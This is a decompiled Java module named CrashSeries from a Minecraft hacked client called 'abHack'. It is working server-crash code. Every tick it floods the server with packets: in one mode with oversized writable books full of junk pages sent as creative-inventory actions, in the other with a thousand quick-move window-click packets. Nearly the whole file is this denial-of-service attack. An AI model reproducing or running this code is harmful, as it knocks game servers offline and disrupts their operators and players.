/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  net.minecraft.init.Items
 *  net.minecraft.inventory.ClickType
 *  net.minecraft.item.ItemStack
 *  net.minecraft.nbt.NBTBase
 *  net.minecraft.nbt.NBTTagCompound
 *  net.minecraft.nbt.NBTTagList
 *  net.minecraft.nbt.NBTTagString
 *  net.minecraft.network.Packet
 *  net.minecraft.network.play.client.CPacketClickWindow
 *  net.minecraft.network.play.client.CPacketCreativeInventoryAction
 *  net.minecraft.util.EnumHand
 */
package me.abHack.features.modules.misc;

import me.abHack.OyVey;
import me.abHack.features.modules.Module;
import me.abHack.features.setting.Setting;
import net.minecraft.init.Items;
import net.minecraft.inventory.ClickType;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketClickWindow;
import net.minecraft.network.play.client.CPacketCreativeInventoryAction;
import net.minecraft.util.EnumHand;

public class CrashSeries
extends Module {
    private final Setting<Mode> mode = this.register(new Setting<Mode>("Mode", Mode.Swap));
    private final Setting<Boolean> escoff = this.register(new Setting<Boolean>("EscOff", true));

    public CrashSeries() {
        super("CrashSeries", "crash", Module.Category.MISC, true, false, false);
    }

    @Override
    public void onLogout() {
        if (this.escoff.getValue().booleanValue() && OyVey.moduleManager.isModuleEnabled("CrashSeries")) {
            this.disable();
        }
    }

    @Override
    public void onLogin() {
        if (this.escoff.getValue().booleanValue() && OyVey.moduleManager.isModuleEnabled("CrashSeries")) {
            this.disable();
        }
    }

    @Override
    public void onTick() {
        if (CrashSeries.fullNullCheck()) {
            return;
        }
        if (this.mode.getValue() == Mode.Book) {
            int i;
            ItemStack book = new ItemStack(Items.WRITABLE_BOOK);
            NBTTagList list = new NBTTagList();
            NBTTagCompound tag = new NBTTagCompound();
            String size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y56h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
            for (i = 0; i < 50; ++i) {
                String siteContent = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y56h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
                NBTTagString tString = new NBTTagString("wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5");
                list.appendTag((NBTBase)tString);
            }
            tag.setString("author", "Gqrl");
            tag.setString("title", "https://wwww.baidu.com");
            tag.setTag("pages", (NBTBase)list);
            book.setTagInfo("pages", (NBTBase)list);
            book.setTagCompound(tag);
            for (i = 0; i < 100 && !CrashSeries.mc.player.isSpectator(); ++i) {
                mc.getConnection().sendPacket((Packet)new CPacketCreativeInventoryAction(0, book));
            }
        }
        if (this.mode.getValue() == Mode.Swap) {
            for (int j = 0; j < 1000; ++j) {
                ItemStack item = new ItemStack(CrashSeries.mc.player.getHeldItem(EnumHand.MAIN_HAND).getItem());
                CPacketClickWindow packet = new CPacketClickWindow(0, 69, 1, ClickType.QUICK_MOVE, item, (short) 1);
                CrashSeries.mc.player.connection.sendPacket((Packet)packet);
            }
        }
    }

    public static enum Mode {
        Swap,
        Book;

    }
}

